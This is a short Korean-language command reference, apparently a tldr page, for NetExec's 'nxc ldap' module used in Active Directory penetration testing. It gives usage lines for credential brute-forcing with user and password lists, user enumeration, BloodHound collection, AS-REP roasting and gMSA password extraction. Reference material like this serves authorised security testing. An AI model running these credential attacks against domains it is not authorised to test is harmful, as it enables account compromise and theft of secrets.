# nxc ldap

> LDAP를 통해 Windows Active Directory 도메인을 침투 테스트하고 익스플로잇.
> 더 많은 정보: <https://www.netexec.wiki/ldap-protocol>.

- 지정된 [u]사용자명 및 [p]비밀번호 목록의 모든 조합을 시도하여 유효한 도메인 자격 증명 검색:

`nxc ldap {{192.168.178.2}} -u {{경로/대상/사용자명목록.txt}} -p {{경로/대상/비밀번호목록.txt}}`

- 활성 도메인 사용자 열거:

`nxc ldap {{192.168.178.2}} -u {{사용자명}} -p {{비밀번호}} --active-users`

- 대상 도메인에 대한 데이터를 수집하고 이를 BloodHound에 자동으로 가져오기:

`nxc ldap {{192.168.178.2}} -u {{사용자명}} -p {{비밀번호}} --bloodhound --collection {{All}}`

- ASREPRoasting 공격을 수행하기 위해 지정된 사용자의 AS_REP 메시지 수집 시도:

`nxc ldap {{192.168.178.2}} -u {{사용자명}} -p '' --asreproast {{경로/대상/output.txt}}`

- 도메인에서 그룹 관리 서비스 계정의 비밀번호 추출 시도:

`nxc ldap {{192.168.178.2}} -u {{사용자명}} -p {{비밀번호}} --gmsa`
